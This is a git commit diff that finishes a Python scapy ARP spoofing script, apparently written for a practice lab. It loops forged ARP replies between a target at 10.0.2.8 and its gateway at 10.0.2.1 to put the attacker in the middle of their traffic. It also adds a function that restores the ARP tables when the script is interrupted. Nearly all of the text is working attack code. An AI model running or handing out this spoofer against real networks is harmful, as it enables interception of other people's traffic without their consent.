9015c1c8da2c15c34fa6add95f45b1edf1ca0450
Maffeys <matiusz98@gmail.com>
2020-01-13 17:21:51 -0500

    ARP spoofer finished

--- arp_spoof.py
+++ arp_spoof.py
@@ -17,13 +17,24 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+def restore(destination_ip, source_ip):
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip),
+                       psrc=source_ip, hwsrc=get_mac(source_ip))
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "10.0.2.8"
+gateway_ip = "10.0.2.1"
+
 sent_packets_count = 0
 try:
     while True:
-        spoof("10.0.2.8", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.8")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packets_count += 2
         print("\r[+] Sending 2 packets regularly... Total packets sent: " + str(sent_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Execution aborted.")
+    print("\n[+] Execution aborted. Restoring ARP tables...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
